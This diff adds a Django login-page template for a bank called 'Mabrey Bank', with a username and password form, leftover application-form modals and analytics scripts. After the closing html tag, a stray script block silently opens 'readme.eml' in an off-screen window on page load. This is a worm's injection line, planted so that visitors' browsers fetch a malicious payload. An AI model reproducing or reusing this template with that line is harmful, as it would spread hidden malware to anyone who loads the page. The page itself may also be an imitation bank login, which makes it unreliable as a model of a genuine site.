@@ -1,0 +1,269 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Online Account Login - Mabrey Bank</title>
+    <!-- <link href="/images/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" /> -->
+    <link href="{% static 'css/slicknav.min.css' %}" rel="stylesheet" type="text/css" />
+    <link href="{% static 'css/template.css' %}" rel="stylesheet" type="text/css" />
+
+    <!-- Bootstrap -->
+    <link href="{% static 'css/bootstrap.min.css' %}" rel="stylesheet" media="screen">
+
+    <link href="{% static 'css/style.css' %}" rel="stylesheet">
+
+    <style>
+        #content {
+            margin: 0 auto;
+            width: 960px;
+            padding-top: 20px;
+            margin-top: 20px;
+            margin-bottom: 100px;
+        }
+
+        h3 {
+            font-weight: 500;
+            font-family: 'Oxygen';
+            font-size: 24px;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        h4 {
+            font-size: 18px;
+            font-weight: 500;
+            font-family: 'Oxygen';
+            margin-top: 10px;
+            margin-bottom: 10px;
+            line-height: 1.1;
+        }
+
+        .center,
+        .table td.center,
+        .table th.center {
+            text-align: center;
+        }
+
+        #mobilemenuck-1-mobile,
+        #mobilemenuck-1-mobile-bar {
+            position: fixed !important;
+        }
+
+        .mobilemenuck-bar-title {
+            display: none !important;
+        }
+
+        [data-id="mobilemenuck-1"] .mobilemenuck-item>.level1 {
+            background: #B29363 !important;
+        }
+    </style>
+
+    <link href="https://fonts.googleapis.com/css?family=Oxygen:300,400,700" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400" rel="stylesheet">
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0css/select2.min.css" rel="stylesheet" />
+    <link href="{% static 'css/zebra_datepicker.min.css' %}" rel="stylesheet" />
+</head>
+
+<div id="flexwrap">
+    <div id="header">
+        <div class="container">
+            <div class="row-fluid">
+                <div class="span4">
+                    <div id="motto">
+                        <a href="/"><img src="{% static 'images/logo-color.svg' %}"></a>
+                    </div>
+                </div>
+                <div class="span4">
+                    <div id="motto">
+                        <h1 class="center">MABREY<br /> BANK<br><br></h1>
+                    </div>
+                </div>
+
+            </div>
+
+            <div id="hero">
+
+            </div>
+        </div>
+    </div>
+    {% for message in messages %}
+        <p style="color: red">{{message}}</p>
+    {% endfor %}
+    <div id="content" style="min-height:600px;">
+        <h1>Online Account Login Form</h1>
+        <form action="{% url 'core:login' %}" id="app-form" method="POST">
+            {% csrf_token %}
+            
+            <br />
+            <div id="on_behalf">
+
+                <div class="control-group">
+                    <label class="control-label" for="relationship_contact_details">Username :</label>
+                    <div class="controls">
+                        <input type="text" class="span12" id="relationship_contact_details"
+                            name="username">
+                        <span class="help-block"></span>
+                    </div>
+                </div>
+
+                <div class="control-group">
+                    <label class="control-label" for="relationship_contact_details">Password :</label>
+                    <div class="controls">
+                        <input type="password" class="span12" value="" id="relationship_contact_details"
+                        name="password">
+                        <span class="help-block"></span>
+                    </div>
+                </div>
+            </div>
+     
+
+            <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+            <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+            <button type="submit" class="btn btn-primary pull-left">Login</button>
+
+
+            <div class="clearfix"></div>
+
+        </form>
+    </div>
+
+    <div class="modal fade" tabindex="-1" role="dialog" id="modal-cbl" style="display:none;">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                            aria-hidden="true">&times;</span></button>
+                    <h4 class="modal-title">Save and come back later</h4>
+                </div>
+                <div class="modal-body">
+                    <p>You can save this application form at any time.</p>
+                    <p>Enter a valid email address below, an email will be sent to you with a link to come back to where
+                        you were in the application.</p>
+                    <input type="email" value="" class="form-control" id="cbl-email-enter"
+                        placeholder="Email address" />
+                    <p>Enter a valid 4+ character pass code. You will need to remember this and enter it when you resume
+                        your application.</p>
+                    <input type="text" value="" pattern=".{4,}" required title="4 characters minimum"
+                        class="form-control" id="cbl-pass-enter" placeholder="Password" />
+                    <p>You can still continue with the application now, and as long as you proceed past the current
+                        page, the link you have received will have all of your changes.</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Cancel and continue
+                        application</button>
+                    <button type="button" class="btn btn-primary" id="cbl-submit">Send me a link to continue
+                        later</button>
+                </div>
+            </div>
+            <!-- /.modal-content -->
+        </div>
+        <!-- /.modal-dialog -->
+    </div>
+    <!-- /.modal -->
+
+
+    <div class="modal fade" tabindex="-1" role="dialog" id="modal-reset" style="display:none;">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                            aria-hidden="true">&times;</span></button>
+                    <h4 class="modal-title">Reset Form</h4>
+                </div>
+                <div class="modal-body">
+                    <p>By clicking reset form you will restart the application process, any unsaved progress will be
+                        lost.</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Cancel and continue
+                        application</button>
+                    <button type="button" class="btn btn-primary" id="reset-submit">Reset form and start a new
+                        application</button>
+                </div>
+            </div>
+            <!-- /.modal-content -->
+        </div>
+        <!-- /.modal-dialog -->
+    </div>
+    <!-- /.modal -->
+
+    <div id="footer">
+        <div class="container">
+
+            <hr>
+
+            <div class="row-fluid">
+                <div class="span6">
+                    <div class="row-fluid">
+                        <div class="span7">
+                            <div class="nav-wrapped ">
+                                <ul class="nav" role="navigation">
+                                    <li class="item-115"><a href="/">Security &amp; Privacy Statement</a></li>
+                                    <li class="item-119"><a href="/" target="_blank">Terms &amp; Conditions</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="span5">
+                            <div class="nav-wrapped ">
+                                <ul class="nav" role="navigation">
+                                    <li class="item-124"><a href="">Latest News</a></li>
+                                    <li class="item-125"><a href="{% url 'core:contact-us' %}">Contact Us</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="span6">
+
+
+                    <div class="custom">
+                        <p>Copyright 2024 © Mabrey Bank Limited. All rights reserved.<br />202 N Broadway 
+                            Haskell, OK 74436 <br />Ph: <a href="tel:+13372145926">+1 337 214 5926</a>
+                              Email: info@mbrybnaccess.com
+                        </p>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+<script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+    ga('create', 'UA-96534099-1', 'auto');
+    ga('send', 'pageview');
+</script>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-migrate/3.3.2/jquery-migrate.min.js"
+    integrity="sha256-EG/NjXI+2n2SomiTpDnM75mOX8aK0iglNgcUPYAejNg=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0/js/select2.min.js"></script>
+
+<script src="{% static 'javascript/zebra_datepicker.min.js' %}"></script>
+<script src="{% static 'javascript/form.js' %}"></script>
+<script src="{% static 'javascript/page0.js' %}"></script>
+<script src="{% static 'javascript/bootstrap.min.js' %}"></script>
+</body>
+
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
